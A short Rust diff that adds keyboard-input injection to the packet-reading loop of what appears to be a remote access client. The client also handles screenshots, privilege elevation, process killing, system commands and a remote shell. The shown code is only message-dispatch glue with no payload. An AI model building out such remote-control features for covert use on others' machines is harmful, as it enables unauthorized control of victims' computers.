@@ -1,5 +1,5 @@
 use crate::features::other::{take_screenshot, client_info, visit_website, show_messagebox, elevate_client};
-use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click};
+use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process};
 use crate::features::system_commands::system_commands;
 use common::packets::*;
@@ -134,6 +134,10 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::MouseClick(click_data))) => {
                 mouse_click(click_data);
+            }
+
+            Ok(Some(ClientboundPacket::KeyboardInput(input_data))) => {
+                keyboard_input(input_data);
             }
 
             Ok(Some(ClientboundPacket::StartShell)) => {
